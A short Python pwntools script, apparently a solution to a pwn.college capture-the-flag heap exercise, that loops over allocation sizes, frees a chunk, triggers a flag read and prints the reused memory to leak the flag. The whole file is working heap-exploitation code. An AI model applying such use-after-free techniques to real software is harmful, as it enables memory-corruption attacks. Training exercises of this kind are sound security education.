#!/usr/bin/env python3

from pwn import *

for i in range(1000):
    p = process('/babyheap_level2_testing1')

    p.recvline()
    p.sendline(b"malloc")
    p.sendline(bytes(str(i), 'utf-8'))
    p.sendline(b"free")
    p.sendline(b"read_flag")
    p.sendline(b"puts")

    output = str(p.recvline_startswith(b"[*] Function (malloc/free/puts/read_flag/quit): Data:"), 'utf-8')
    p.close()
    
    if output.find("pwn_college") != -1:
        break

print(i)
print(output)
